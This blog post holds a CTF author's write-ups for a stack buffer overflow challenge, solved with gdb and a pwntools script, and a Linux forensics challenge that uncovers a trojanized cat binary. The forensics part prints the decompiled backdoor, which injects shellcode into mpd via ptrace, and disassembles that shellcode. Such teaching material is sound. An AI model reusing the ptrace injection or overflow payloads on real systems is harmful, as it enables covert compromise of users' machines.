---
layout: post
title: blahajctf qualifiers author writeups
date: 2025-12-20 05:40:00 +0800
---

recommended listening is [bed for the scraping by fugazi](https://www.youtube.com/watch?v=SSFDzFxlNRE).

![nana](https://i.imgur.com/l0FZWHX.png)

## pwn/DISTURBING THE PEACE, 106 solves

> **Author:** wrenches
>
> _Expected Difficulty: Easy_
>
> if you think about it, mementos is kind of like the heap

it's a beginner pwn challenge themed around Persona.

```c
int main(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  int monster_hp = 25000;
  char persona[16];
  int player_hp = 500;

  init();

  while ((player_hp > 0) && (monster_hp > 0)) {
    print_battle(monster_hp, player_hp);
    menu();
    printf(BOLD "YOUR INPUT > " RESET);

    char c = getc(stdin);
    getchar(); // exhaust newline

    switch (c) {
       case '1': {
        puts(GREEN "MELEE ATTACK! You did 50 damage to the monster." RESET);
        monster_hp -= 50;
        break;
      }

      case '2': {
        printf(CYAN "What persona are you going to switch to, leader? > " RESET);
        fgets(persona, 32, stdin);
        break;
      }

      case '3': {
        flee();
        break;
      }

      default:
        puts(RED "Invalid option, leader!" RESET);
    }

    monster_attack(&player_hp);
  }

  if (player_hp <= 0) {
    puts(RED "\nYour eyes are getting weary..." RESET);
    puts(YELLOW "Better luck next time!" RESET);
    exit(0);
  }

  if (monster_hp <= 0) {
    puts(GREEN BOLD "\nYou've defeated the monster! Good job, leader!" RESET);
    win();
    exit(0);
  }
}
```

the goal is to beat the monster so that we can get the flag. unfortunately, the monster has 25000 hp and we only have 500 hp, so it is impossible to beat the monster just through attacking.

we have a buffer overflow vulnerability, however: the `persona` variable is defined as an array of 16 characters, but in the option to switch personas, we read 32 characters into that buffer. this means we are able to overflow that buffer and overwrite adjacent variables on the stack.

```c
char persona[16];
...
case '2': {
  printf(CYAN "What persona are you going to switch to, leader? > " RESET);
  fgets(persona, 32, stdin);
  break;
}
```

by dynamically debugging w/ gdb, we can see _just_ what we are able to overwrite on the stack. a nice technique i like to use for debugging these pwn challenges is compiling the given challenge with _debug symbols_, by using the `-g` flag (`// gcc -g -O0 -o main main.c`*).

* _note the -O0 compilation flag, this tells the compiler to not optimize anything. this is important because with different layers of optimization, the compiler might switch around the orders of variables on the stack_.

then, we just run the binary with `gdb ./main` and place breakpoints by referring to the debug symbols. compiling with debug symbols allows us to see the source code of the binary from the debugger ourselves, so we don't need to resort to reading assembly. we can do this by making use of the `list` command:

```c
gef> list main.c:85
80	       puts(GREEN "MELEE ATTACK! You did 50 damage to the monster." RESET);
81	       monster_hp -= 50;
82	       break;
83	     }
84	
85	     case '2': {
86	       printf(CYAN "What persona are you going to switch to, leader? > " RESET);
87	       fgets(persona, 32, stdin); <- our vulnerable function!
88	       break;  
89	     }
```

i'll place a breakpoint at line 86 with `break main.c:86`, and then run the program.

```c
gef> break main.c:86
Breakpoint 1 at 0x143c: file main.c, line 86.
gef> r
Starting program: /home/navi/ctf-setting/blahajctf25/challenges/pwn/disturbing-the-peace/dist/main 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
==================================================
// DISTURBING THE PEACE \\
Watch out leader! This monster's strong...
I'm not sure you'll be able to beat it with attacking alone!
// - SURPRISE ATTACK! - \\
==================================================

--------------------------------------------------
ENEMY HP: 25000
YOUR  HP: 500
--------------------------------------------------

================= ACTION MENU =================
1 > MELEE ATTACK
2 > SWAP PERSONAS
3 > FLEE
===============================================
YOUR INPUT >
```

to view the contents of the stack after we hit the breakpoint, we just input `stack` and look at the addresses. we can also view the values of variables such as `monster_hp` by typing in `p monster_hp`.

```c
gef> stack
----------------------------------------------------------------- Stack top (lower address) -----------------------------------------------------------------
0x7fffffffdbd0|+0x0000|+000: 0x0000000000000000
0x7fffffffdbd8|+0x0008|+001: 0x000001f400000000
0x7fffffffdbe0|+0x0010|+002: 0x00000a6473667364 ('dsfsd\n'?) <<< our input
0x7fffffffdbe8|+0x0018|+003: 0x0000000000000000
0x7fffffffdbf0|+0x0020|+004: 0x0000000000000000
0x7fffffffdbf8|+0x0028|+005: 0x0000[61a8]32fe19d0 <<< where the monster_hp is stored
0x7fffffffdc00|+0x0030|+006: 0x00007fffffffdd18  ->  0x00007fffffffe041  ->  0x616e2f656d6f682f '/home/navi/ctf-setting/blahajctf25/challenges/pwn/disturbing-the[...]'
0x7fffffffdc08|+0x0038|+007: 0x00007ffff7c29f75 <__libc_start_call_main+0x75>  ->  0xe8000190d4e8c789  <-  retaddr[1] ($savedip)
--------------------------------------------------------------- Stack bottom (higher address) ---------------------------------------------------------------
gef> p monster_hp
$2 = 0x61a8
gef>
```

we can now see the stack layout. note the following: the monster hp, `0x61a8`, is stored below where our input gets written to with respect to the stack. so, let's see if we can overwrite this value by just spamming 'A's for now.

```c
gef> stack
----------------------------------------------------------------- Stack top (lower address) -----------------------------------------------------------------
0x7fffffffdbd0|+0x0000|+000: 0x0000000000000000
0x7fffffffdbd8|+0x0008|+001: 0x000001f400000000
0x7fffffffdbe0|+0x0010|+002: 0x4141414141414141 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
0x7fffffffdbe8|+0x0018|+003: 0x4141414141414141 'AAAAAAAAAAAAAAAAAAAAAAA'
0x7fffffffdbf0|+0x0020|+004: 0x4141414141414141 'AAAAAAAAAAAAAAA'
0x7fffffffdbf8|+0x0028|+005: 0x0041414141414141 ('AAAAAAA'?)
0x7fffffffdc00|+0x0030|+006: 0x00007fffffffdd18  ->  0x00007fffffffe041  ->  0x616e2f656d6f682f '/home/navi/ctf-setting/blahajctf25/challenges/pwn/disturbing-the[...]'
0x7fffffffdc08|+0x0038|+007: 0x00007ffff7c29f75 <__libc_start_call_main+0x75>  ->  0xe8000190d4e8c789  <-  retaddr[1] ($savedip)
--------------------------------------------------------------- Stack bottom (higher address) ---------------------------------------------------------------
gef> p monster_hp
$4 = 0x414141
```

we can! we're now able to modify the `monster_hp` just by exploiting our buffer overflow. now, our goal is to be more delicate: we want to overwrite `monster_hp` to a _lower value_.

to do this, we need to figure out what offset we need to write at. i.e., which character of our input corresponds to our inevitable value of `monster_hp`?

we can do this by using `pwntools`' `cyclic_gen` function. essentially, it just writes a specific 'pattern' of bytes that we can use to easily calculate offsets. we'll generate the pattern with the following commands below.

```py
>>> from pwn import cyclic_gen
>>> a = cyclic_gen()
>>> a.get(64)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'
```

then, we'll put the pattern in as our input.

```py
------------------------------------------------------ source: main.c+86 ----
     81           monster_hp -= 50;
     82           break;
     83         }
     84   
     85         case '2': {
                           // persona = 0x00007fffffffdbe0  ->  0x6161616261616161 'aaaabaaacaaadaaaeaaafaaagaaahaa'
*->  86           printf(CYAN "What persona are you going to switch to, leader? > " RESET);
     87           fgets(persona, 32, stdin);
     88           break;
     89         }
     90   
     91         case '3': {
---------------------------------------------------------------- threads ----
[*Thread Id:1, tid:386064] Name: "main", stopped at 0x55555555543c <main+0xe2>, reason: BREAKPOINT
------------------------------------------------------------------ trace ----
[*#0] 0x55555555543c <main+0xe2>
[ #1] 0x7ffff7c29f75 <__libc_start_call_main+0x75>
[ #2] 0x7ffff7c2a027 <__libc_start_main+0x87> (frame name: __libc_start_main_impl)
[ #3] 0x5555555550f1 <_start+0x21>
-----------------------------------------------------------------------------
gef> x/s &monster_hp
0x7fffffffdbfc:	"haa"
```

we can see that our `monster_hp` was overwritten with the value `haa`. then, we find the offset of this pattern:

```python
>>> a.find(b'haa')
(28, 0, 28)
```

now we know that we need to write **28** filler bytes before we can actually overwrite our `monster_hp`. just to verify, let's write 28 As, then 3 Bs:

```c
------------------------------------------------------ source: main.c+86 ----
     81           monster_hp -= 50;
     82           break;
     83         }
     84   
     85         case '2': {
                           // persona = 0x00007fffffffdbe0  ->  0x4141414141414141 'AAAAAAAAAAAAAAAAAAAAAAAAAAAABBB'
*->  86           printf(CYAN "What persona are you going to switch to, leader? > " RESET);
     87           fgets(persona, 32, stdin);
     88           break;
     89         }
     90   
     91         case '3': {
---------------------------------------------------------------- threads ----
[*Thread Id:1, tid:386628] Name: "main", stopped at 0x55555555543c <main+0xe2>, reason: BREAKPOINT
------------------------------------------------------------------ trace ----
[*#0] 0x55555555543c <main+0xe2>
[ #1] 0x7ffff7c29f75 <__libc_start_call_main+0x75>
[ #2] 0x7ffff7c2a027 <__libc_start_main+0x87> (frame name: __libc_start_main_impl)
[ #3] 0x5555555550f1 <_start+0x21>
-----------------------------------------------------------------------------
gef> 
gef> p monster_hp
$7 = 0x424242
```

success!

now, we want to entirely zero out the monster's hp. we do this by writing nullbytes. we'll want to write 28 filler characters, then 3 nullbytes.

```py
from pwn import *

p = process("./main")

p.sendlineafter(b"YOUR INPUT > ", b'2')
p.sendlineafter(b" > ", b"A" * 28 + b'\00' * 3)
p.interactive()
```

we first connect to our process, then pick the option that lets us set personas (2). afterwards, we send our payload of 28 'A' bytes and 3 null bytes.

the `p.interactive()` drops us into any interactive shell that the program might create (for this challenge it's not necessary, but it's good practice).

```bash
navi@curette (/disturbing-the-peace/sol) > python solve.py
[+] Starting local process './main': pid 388773
[*] Switching to interactive mode

!! The monster lunges! It does 100 damage.
Leader, are you okay?

You've defeated the monster! Good job, leader!
blahaj{https://www.youtube.com/watch?v=SKwkvsnUOAk}
```

* note: we definitely could have just spammed nullbytes and won! there's nothing in the buffer that we necessarily need to preserve, so just sending 32 null bytes would work. however, there are some harder pwn challenges which necessitate a certain degree of finesse and care in your payload writing, so it's good practice to do so.

## foren/sleep-to-dream, 0 solves

> **Author:** wrenches
>
> _Expected Difficulty: insane_
>
> someone's installed a backdoor into the Number One Fiona Apple Fan's computer! where's the backdoor? 

the previous writeup was a beginner friendly introduction to pwn. i will aim to keep this writeup beginner friendly as well, but this was a significantly harder challenge that got no human solves during the ctf.

the `dist` is a 5GB zip, consisting of a memory dump and an .E01 file.

some background - a memory dump is exactly that: a dump of the RAM at some point in time while the computer is running. to interact w/ a dump (specifically, a Linux memory dump), we use the tool [volatility](https://github.com/volatilityfoundation/volatility3). for the .E01 file, that's a proprietary image file format by EnCase, a digital forensics company. 

* also this writeup will detail the process of solving this challenge on Linux, and not on Windows.

in essence, what we have is a dump of the system's memory, as well as the entire contents of the system's hard-drive.

### STAGE 0: SETUP

we deal with the hard drive first. given it's an .E01 file, we need to convert it into a format that we can easily deal with. we do this w/ `ewfexport`, a utility provided by the `ewf-tools` package.

```bash
navi@curette (tting/sleep-to-dream/dist) > ewfexport sleep-to-dream.E01 
ewfexport 20140816

Information for export required, please provide the necessary input
Export to format (raw, files, ewf, smart, ftk, encase1, encase2, encase3, encase4, encase5, encase6, encase7, encase7-v2, linen5, linen6, linen7, ewfx) [raw]: 
Target path and filename without extension or - for stdout: 
Target is required, please try again or terminate using Ctrl^C.
Target path and filename without extension or - for stdout: output
Evidence segment file size in bytes (0 is unlimited) (0 B <= value <= 7.9 EiB) [0 B]: 
Start export at offset (0 <= value <= 21474836480) [0]: 
Number of bytes to export (0 <= value <= 21474836480) [21474836480]: 

Export started at: Dec 21, 2025 14:53:50
This could take a while.
```

(if you don't have `ewfexport`, install it w/ `sudo apt-get install ewf-tools`).

essentially, what this does is convert it into a raw 20GB file, and we can use a tool known as `losetup` to treat this file as if it were a hard drive connected to our computer. `losetup` is short for `loop device setup`, and a loop device lets Linux interact with our extracted raw image.

the end goal is to be able to do things like `ls`, `cat`, so on and so forth in our disk image, and this is how we are able to achieve that.

after `ewfexport` finishes, we now have the following file:

```
navi@curette (tting/sleep-to-dream/dist) > file output.raw        
output.raw: DOS/MBR boot sector
```

this tells us that our disk image has a partition table. a **partition table** means that different parts of the hard drive are used for different purposes. we can see the entries in the partition table below:

```bash
navi@curette (tting/sleep-to-dream/dist) > fdisk -l output.raw
Disk output.raw: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa02fda52

Device      Boot    Start      End  Sectors  Size Id Type
output.raw1 *        2048 39684095 39682048 18.9G 83 Linux
output.raw2      39686142 41940991  2254850  1.1G  f W95 Extd (LBA)
output.raw5      39686144 41940991  2254848  1.1G 82 Linux swap / Solaris
```

`output.raw1` is our actual filesystem of interest, while `output.raw5` is for swap memory, and i _think_ `output.raw2` should be for the bootloader? i'm not sure though. either way, because this is a partitioned disk image, we need to tell `losetup` to set up a different loop device for each partition with `sudo losetup -Pf output.raw`.

```bash
navi@curette (tting/sleep-to-dream/dist) > sudo losetup -Pf output.raw
                                                                             
navi@curette (tting/sleep-to-dream/dist) > ls /dev/loop*         
/dev/loop0    /dev/loop0p5  /dev/loop3  /dev/loop6
/dev/loop0p1  /dev/loop1    /dev/loop4  /dev/loop7
/dev/loop0p2  /dev/loop2    /dev/loop5  /dev/loop-control
```

the devices in question are `/dev/loop0p...`, specifically, `/dev/loop0p1`. we now have this file as a device on our system (much like any USB connection), and we can just mount it and read it as a filesystem.

```bash
navi@curette (tting/sleep-to-dream/dist) > sudo mount /dev/loop0p1 mnt
navi@curette (tting/sleep-to-dream/dist) > cd mnt 
navi@curette (g/sleep-to-dream/dist/mnt) > ls           
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
```

yay! now we can actually begin to do..

### STAGE 1: ACTUAL FORENSICS WORK

we're informed that there's a backdoor somewhere. we can just peek around the files. on this system, there is a user named `fiona`, and her home directory has a `lyrics` folder.

```bash
navi@curette (ist/mnt/home/fiona/lyrics) > ls -alps     
total 52
4 drwxrwxr-x 2 navi navi 4096 Dec 10 14:18  ./
4 drwx------ 4 navi navi 4096 Dec 10 15:11  ../
4 -rw-rw-r-- 1 navi navi 1375 Dec 10 14:27 '10 - Pale September.txt'
4 -rw-rw-r-- 1 navi navi 1901 Dec 10 14:27 '1 - Sleep to Dream.txt'
4 -rw-rw-r-- 1 navi navi  717 Dec 10 14:27 '2 - Sullen Girl.txt'
4 -rw-rw-r-- 1 navi navi 1207 Dec 10 14:27 '3 - Shadowboxer.txt'
4 -rw-rw-r-- 1 navi navi  128 Dec 10 14:28 '4 - Criminal.txt'
4 -rw-rw-r-- 1 navi navi 1141 Dec 10 14:27 '5 - Slow Like Honey.txt'
4 -rw-rw-r-- 1 navi navi  905 Dec 10 14:27 '6 - The First Taste.txt'
4 -rw-rw-r-- 1 navi navi 1556 Dec 10 14:27 '7 - Never Is A Promise.txt'
4 -rw-rw-r-- 1 navi navi  923 Dec 10 14:27 '8 - The Child is Gone.txt'
4 -rw-rw-r-- 1 navi navi 1031 Dec 10 14:27 '9 - Pale September.txt'
4 -rwxrwxr-x 1 navi navi  126 Dec 10 14:27  read_lyrics.sh
```

everything here seems mostly innocuous, except for the fact that `4 - Criminal.txt` is entirely nulled out.

```bash
navi@curette (ist/mnt/home/fiona/lyrics) > xxd 4\ -\ Criminal.txt 
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

the script just reads all the files in the directory.

```bash
navi@curette (ist/mnt/home/fiona/lyrics) > cat read_lyrics.sh 
#!/bin/bash
for file in *.txt; do
    [ -e "$file" ] || continue
    echo -e "\n------\n$file\n------\n"
    cat "$file"
done
```

so, the backdoor is relatively nonobvious. as the challenge author i intended there to be a level of ingenuity required with being able to identify the backdoor, as i hid it quite well. there are two different ways to identify the backdoor, both of which require some baseline knowledge of linux filesystems:

#### THING ONE: MODIFIED TIMES

on a linux filesystem, we can see what times files were last modified. on a clean install of Linux, most of the system's files (such as those in `/usr/bin`, `/sys`, `/etc`) will _NOT_ have recent last modified times.

we can sort each file on the system by their last modified time:

```bash
navi@curette (tting/sleep-to-dream/dist) > find mnt -type f -printf '%T@ %p\n' | sort -nr | head
1765460694.1095551690 mnt/var/log/journal/afbcd40694474a8dbe124bf51e279e7e/system.journal
1765460693.7295586580 mnt/usr/bin/cat
1765460672.6543820000 mnt/var/lib/systemd/timesync/clock
1765460661.6619593080 mnt/etc/ssh/sshd_config
1765460617.4080000000 mnt/var/log/wtmp.db
1765460614.9120000000 mnt/etc/resolv.conf
1765460614.9040000000 mnt/var/lib/dhcpcd/ens3.lease
1765460608.2440000000 mnt/var/log/wtmp
1765460608.1640000000 mnt/boot/grub/grubenv
1765460607.6320000000 mnt/var/lib/systemd/random-seed
```

* now is a good time to discuss Good Usecases for LLMs as opposed to Bad Ones. me personally, i can't write this command myself because i don't know the syntax off the top of my head, so i just tell the LLM to write a command that will find all last modified times, sort them, and then give me the first few. i find that using LLMs sparingly like this in these contexts saves time, is quite useful for keeping me on track, and most importantly, **still keeps me knowledgeable as to what the fuck i am doing**. if at any point you realize you do not know what you are doing anymore, then that probably means you should put the chatgpt down.

indeed, we can see that the most recently modified file is `/usr/bin/cat`. hm!

#### THING TWO: FILE HASHES

i won't go over the process of doing this because it's annoying to do. but given that this is a Linux filesystem, most of the file hashes of things in `/usr/bin` should be the same. if anyone has changed anything in those folders, you would be able to compare them with a fresh install of Linux, and then find any outliers. a tool like VirusTotal is quite nice for this, let's take a binary that we know is not backdoored and calculate its sum.

```
navi@curette (to-dream/dist/mnt/usr/bin) > md5sum xz  
1ce5746fe096041370ea72d622b0de74  xz
```

putting this value into VirusTotal:

![virustotal](https://i.imgur.com/skniJ8g.png)

VirusTotal tells us that this is a file distributed by Linux itself. we're good!

### STAGE 2: REVERSING THE BACKDOOR

```
navi@curette (to-dream/dist/mnt/usr/bin) > file cat 
cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89b3f1cc0ac8fdb8546615ff55fd4525b6182f50, for GNU/Linux 3.2.0, not stripped
```

unfortunately now it's time to do some reverse engineering. throw this into your favorite decompiler and jump into the `main()` function.

```c
  }
  pbVar11 = (byte *)0x0;
  local_19c = param_1;
  local_198 = param_2;
  initialize(param_2[1]);
  set_program_name(*param_2);
  setlocale(6,"");
  bindtextdomain("coreutils","/usr/local/share/locale");
  textdomain("coreutils");
  atexit(close_stdout);
  local_186 = '\0';
  local_187 = '\0';
  local_1a0 = (local_1a0._2_2_ & 0xff00) << 0x10;
  do {
    iVar5 = getopt_long(local_19c,local_198,"benstuvAET",long_options.0,0);
    if (iVar5 == -1) {
      iVar6 = fstat(1,&local_158);
      iVar5 = optind;
      if (iVar6 < 0) {
        uVar15 = dcgettext(0,"standard output",5);
        piVar17 = __errno_location();
        auVar25 = error(1,*piVar17,uVar15);
        uVar15 = uStack_1d8;
        uStack_1d8 = auVar25._0_8_;
        __libc_start_main(main,uVar15,&local_1d0,0,0,auVar25._8_8_,&uStack_1d8);
        do {
                    /* WARNING: Do nothing block with infinite loop */
        } while( true );
      }
```

from a glance, it's not obvious where the backdoor might be. a useful thing to do is compare and contrast with the actual source code of `cat`, which is located in GNU's `coreutils` [repository](https://github.com/coreutils/coreutils/blob/master/src/cat.c).

```c
    {GETOPT_HELP_OPTION_DECL},
    {GETOPT_VERSION_OPTION_DECL},
    {nullptr, 0, nullptr, 0}
  };

  initialize_main (&argc, &argv);
  set_program_name (argv[0]);
  setlocale (LC_ALL, "");
  bindtextdomain (PACKAGE, LOCALEDIR);
  textdomain (PACKAGE);

  /* Arrange to close stdout if we exit via the
     case_GETOPT_HELP_CHAR or case_GETOPT_VERSION_CHAR code.
     Normally STDOUT_FILENO is used rather than stdout, so
     close_stdout does nothing.  */
  atexit (close_stdout);
```

in the original source, the function is called `initialize_main`, but in our decompilation, it's called `initialize`.

decompiling that function specifically:

```c
undefined8 initialize(char *param_1)

{
  long lVar1;
  undefined8 uVar2;
  int iVar3;
  uint __pid;
  long lVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  undefined8 *puVar7;
  undefined8 uVar8;
  int local_6ec;
  char *local_6e8;
  undefined8 uStack_6e0;
  undefined8 local_6d8 [213];
  undefined8 local_30;
  
  uVar8 = 0;
  puVar5 = local_6d8;
  puVar6 = &DAT_00108a40;
  puVar7 = puVar5;
  for (lVar4 = 0xd5; lVar4 != 0; lVar4 = lVar4 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  iVar3 = strcmp(param_1,"4 - Criminal.txt");
  if (iVar3 == 0) {
    uVar8 = 0;
    puts("\n\n\n\n");
    __pid = fork();
    local_6e8 = "/usr/bin/mpd";
    uStack_6e0 = 0;
    if (__pid == 0) {
      uVar8 = 0xffffffff;
      lVar4 = ptrace(PTRACE_TRACEME,0,0,0);
      if (lVar4 != -1) {
        uVar8 = 1;
        execve("/usr/bin/mpd",&local_6e8,(char **)0x0);
      }
    }
    else {
      waitpid(__pid,&local_6ec,0);
      lVar4 = get_entry_point(__pid);
      lVar4 = lVar4 - (long)puVar5;
      do {
        uVar2 = *puVar5;
        lVar1 = lVar4 + (long)puVar5;
        puVar5 = puVar5 + 1;
        ptrace(PTRACE_POKETEXT,(ulong)__pid,lVar1,uVar2);
      } while (puVar5 != &local_30);
      ptrace(PTRACE_DETACH,(ulong)__pid,0,0);
    }
  }
  return uVar8;
}
```

we now see calls to `ptrace()`, references to `/usr/bin/mpd`, and a mysterious `&DAT_00108a40` variable. uh oh!

let's go over the functionality of this `initialize()` snippet. it starts with this check:

```
iVar3 = strcmp(param_1,"4 - Criminal.txt");
```

`param_1` is the first argument that gets passed into `cat`, and this is comparing it with a known value `4 - Criminal.txt`. if the argument matches, then we execute the rest of the backdoor, otherwise we do nothing.

afterwards:

```c
  if (iVar3 == 0) {
    uVar8 = 0;
    puts("\n\n\n\n");
    __pid = fork();
    local_6e8 = "/usr/bin/mpd";
    uStack_6e0 = 0;
    if (__pid == 0) {
      uVar8 = 0xffffffff;
      lVar4 = ptrace(PTRACE_TRACEME,0,0,0);
      if (lVar4 != -1) {
        uVar8 = 1;
        execve("/usr/bin/mpd",&local_6e8,(char **)0x0);
      }
    }
    else {
      waitpid(__pid,&local_6ec,0);
      lVar4 = get_entry_point(__pid);
      lVar4 = lVar4 - (long)puVar5;
      do {
        uVar2 = *puVar5;
        lVar1 = lVar4 + (long)puVar5;
        puVar5 = puVar5 + 1;
        ptrace(PTRACE_POKETEXT,(ulong)__pid,lVar1,uVar2);
      } while (puVar5 != &local_30);
      ptrace(PTRACE_DETACH,(ulong)__pid,0,0);
    }
  }
  return uVar8;
}
```

it's a lot of code but in summary:
  - the process gets forked.
  - the child waits until it gets ptraced by the parent.
  - the child process spawns a new `/usr/bin/mpd` instance (music player daemon).
  - the parent finds the PID of the child process, and _replaces the instructions that the `mpd` process will execute with its own shellcode defined in `&DAT_00108a40`.

essentially, we are hiding our shellcode in the `mpd` process. cool! now:

### STAGE 4: WHAT IS THE SHELLCODE DOING

first let's dump it.

![im](https://i.imgur.com/yP3CDut.png)

we essentially just go into Ghidra, highlight the whole thing, go to Copy Special > Python Bytestring, and paste. then, we write a little wrapper to save it to a file.

```python
b = [... bytes ...]
shellcode = open('shellcode.bin', 'wb')
shellcode.write(b)
shellcode.close()
```

and now we can disassemble it:

```bash
navi@curette (~/Downloads/hissss) > ndisasm -b 64 shellcode.bin
00000000  488D3DF9FFFFFF    lea rdi,[rel 0x0]
00000007  4881E700F0FFFF    and rdi,0xfffffffffffff000
0000000E  B80A000000        mov eax,0xa
00000013  BE00400000        mov esi,0x4000
00000018  BA07000000        mov edx,0x7
0000001D  0F05              syscall
0000001F  488D1D82020000    lea rbx,[rel 0x2a8]
00000026  488D350F000000    lea rsi,[rel 0x3c]
0000002D  4889DF            mov rdi,rbx
00000030  B96C020000        mov ecx,0x26c
00000035  F3A4              rep movsb
00000037  E96C020000        jmp 0x2a8
0000003C  B802000000        mov eax,0x2
00000041  488D3DCF010000    lea rdi,[rel 0x217]
00000048  BE02000000        mov esi,0x2
0000004D  4831D2            xor rdx,rdx
00000050  0F05              syscall
00000052  4885C0            test rax,rax
00000055  0F8822010000      js 0x17d
0000005B  4989C4            mov r12,rax
0000005E  B800000000        mov eax,0x0
00000063  4C89E7            mov rdi,r12
00000066  488D352A010000    lea rsi,[rel 0x197]
0000006D  BA80000000        mov edx,0x80
00000072  0F05              syscall
00000074  4989C5            mov r13,rax
00000077  B808000000        mov eax,0x8
0000007C  4C89E7            mov rdi,r12
0000007F  4831F6            xor rsi,rsi
00000082  4831D2            xor rdx,rdx
00000085  0F05              syscall
00000087  B801000000        mov eax,0x1
0000008C  4C89E7            mov rdi,r12
0000008F  488D3592010000    lea rsi,[rel 0x228]
00000096  BA80000000        mov edx,0x80
0000009B  0F05              syscall
0000009D  B84A000000        mov eax,0x4a
000000A2  4C89E7            mov rdi,r12
000000A5  0F05              syscall
000000A7  6A00              push qword 0x0
000000A9  6A3C              push qword 0x3c
000000AB  4889E7            mov rdi,rsp
000000AE  4831F6            xor rsi,rsi
000000B1  B823000000        mov eax,0x23
000000B6  0F05              syscall
000000B8  4883C410          add rsp,0x10
000000BC  4881EC00010000    sub rsp,0x100
000000C3  4889E7            mov rdi,rsp
000000C6  4831C9            xor rcx,rcx
000000C9  880C0F            mov [rdi+rcx],cl
000000CC  48FFC1            inc rcx
000000CF  4881F900010000    cmp rcx,0x100
000000D6  75F1              jnz 0xc9
000000D8  4831C9            xor rcx,rcx
000000DB  4D31C0            xor r8,r8
000000DE  488D35A2000000    lea rsi,[rel 0x187]
000000E5  4889C8            mov rax,rcx
000000E8  4883E00F          and rax,0xf
000000EC  480FB61C06        movzx rbx,byte [rsi+rax]
000000F1  480FB6040F        movzx rax,byte [rdi+rcx]
000000F6  4901C0            add r8,rax
000000F9  4901D8            add r8,rbx
000000FC  4981E0FF000000    and r8,0xff
00000103  4A0FB61C07        movzx rbx,byte [rdi+r8]
00000108  881C0F            mov [rdi+rcx],bl
0000010B  42880407          mov [rdi+r8],al
0000010F  48FFC1            inc rcx
00000112  4881F900010000    cmp rcx,0x100
00000119  75CA              jnz 0xe5
0000011B  4831C9            xor rcx,rcx
0000011E  4D31C0            xor r8,r8
00000121  4D31C9            xor r9,r9
00000124  488D356C000000    lea rsi,[rel 0x197]
0000012B  4C39E9            cmp rcx,r13
0000012E  7D3C              jnl 0x16c
00000130  49FFC0            inc r8
00000133  4981E0FF000000    and r8,0xff
0000013A  4A0FB60407        movzx rax,byte [rdi+r8]
0000013F  4901C1            add r9,rax
00000142  4981E1FF000000    and r9,0xff
00000149  4A0FB61C0F        movzx rbx,byte [rdi+r9]
0000014E  42881C07          mov [rdi+r8],bl
00000152  4288040F          mov [rdi+r9],al
00000156  4801D8            add rax,rbx
00000159  4825FF000000      and rax,0xff
0000015F  480FB61C07        movzx rbx,byte [rdi+rax]
00000164  301C0E            xor [rsi+rcx],bl
00000167  48FFC1            inc rcx
0000016A  EBBF              jmp 0x12b
0000016C  4881C400010000    add rsp,0x100
00000173  B803000000        mov eax,0x3
00000178  4C89E7            mov rdi,r12
0000017B  0F05              syscall
0000017D  B83C000000        mov eax,0x3c
00000182  4831FF            xor rdi,rdi
00000185  0F05              syscall
00000187  66                o16
00000188  657463            gs jz 0x1ee
0000018B  68626F6C74        push qword 0x746c6f62
00000190  637574            movsxd esi,dword [rbp+0x74]
00000193  7465              jz 0x1fa
00000195  7273              jc 0x20a
```

at this point we're satisfied with ourselves and we don't really feel like reading assembly so we can just chuck this into an LLM and have it provide a decompilation for us.

![shellcode](https://i.imgur.com/nemjS09.png)

thanks Gemini! so our shellcode is creating a `RWX` page, reading ciphertext from a file on disk, zeroing out the file on disk, and then slowly decrypting the file. **because** the ciphertext is not present anywhere on the hard-disk, we will need to actually locate it from the memory dump itself. which finally leads us to the last step:

### STAGE 3: DEALING W/ THE MEMORY DUMP

volatility is very finicky with Linux memory dumps. we will need something called a symbol table, which is how volatility is able to know where things are.

we first need to know the kernel version, which is located in `/boot`.

```bash
navi@curette (ep-to-dream/dist/mnt/boot) > ls
config-6.12.57+deb13-amd64
grub
initrd.img-6.12.57+deb13-amd64
System.map-6.12.57+deb13-amd64
vmlinuz-6.12.57+deb13-amd64
```

we then need to find volatility symbols for that version of linux, `6.12.57+deb13`. thankfully enough there is an existing pre-generated table [here](https://github.com/Abyss-W4tcher/volatility3-symbols/tree/master/Debian/amd64/6.12.57%2Bdeb13), but some versions may or may not have symbol tables readily available. in that case, you will have to make your own, which is frankly a tedious and annoying process that i don't like doing.

after we have symbols downloaded properly, we just put it in a `symbols/linux` directory in our current working directory, and run `vol -f mem.dmp -s symbols [plugin we want to use]`. in this case, we just start with `linux.pslist`, which gives us a list of all running processes at the time of the dump.

```bash
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished            
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x90b1c0260000	1	1	0	systemd	0	0	0	0	2025-12-10 06:19:21.109905 UTC	Disabled
0x90b1c0263080	2	2	0	kthreadd	0	0	0	0	2025-12-10 06:19:21.109905 UTC	Disabled
0x90b1c0266100	3	3	2	pool_workqueue_	0	0	0	0	2025-12-10 06:19:21.217905 UTC	Disabled
...
...
...
0x90b1c63d9840	764	764	1	mpd	1000	1000	1000	1000	2025-12-10 06:28:00.553613 UTC	Disabled
```

